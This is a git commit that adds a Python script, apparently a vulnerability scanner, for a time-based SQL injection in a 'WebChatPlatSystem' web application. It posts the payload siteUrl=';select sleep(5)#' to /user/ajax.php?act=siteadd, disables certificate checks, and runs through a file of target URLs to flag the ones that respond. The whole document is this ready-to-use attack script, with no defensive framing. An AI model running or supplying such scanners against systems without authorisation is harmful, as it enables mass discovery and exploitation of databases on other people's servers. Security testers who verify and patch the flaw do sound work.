6cfa9d017500fc4f4539ab0fb7d03edd01902f79
ATonysan <149130294+ATonysan@users.noreply.github.com>
2024-07-18 09:16:35 +0800

    Add files via upload

---
+++ WebChatPlatSystem_ajax_SQLInject.py
@@ -0,0 +1,45 @@
+import requests
+import urllib3
+from urllib.parse import urljoin,quote
+import argparse
+import ssl
+import re
+ssl._create_default_https_context = ssl._create_unverified_context
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def read_file(file_path):
+    with open(file_path, 'r') as file:
+        urls = file.read().splitlines()
+    return urls
+
+def check(url):
+    url = url.rstrip("/")
+    target = urljoin(url, '/user/ajax.php?act=siteadd')
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    data = "siteUrl=';select sleep(5)#'"
+    try:
+        response = requests.post(target, verify=False, headers=headers, data=data,timeout=15, allow_redirects=False)
+        if response.status_code == 200 and 'msg' in response.text and 5 < response.elapsed.total_seconds() < 10:
+            print(f"\033[31mDiscovered:{url}: WebChatPlatSystem_ajax_SQLInject!\033[0m")
+            return True
+    except Exception as e:
+        pass
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--url", help="URL")
+    parser.add_argument("-f", "--txt", help="file")
+    args = parser.parse_args()
+    url = args.url
+    txt = args.txt
+    if url:
+        check(url)
+    elif txt:
+        urls = read_file(txt)
+        for url in urls:
+            check(url)
+    else:
+        print("help")
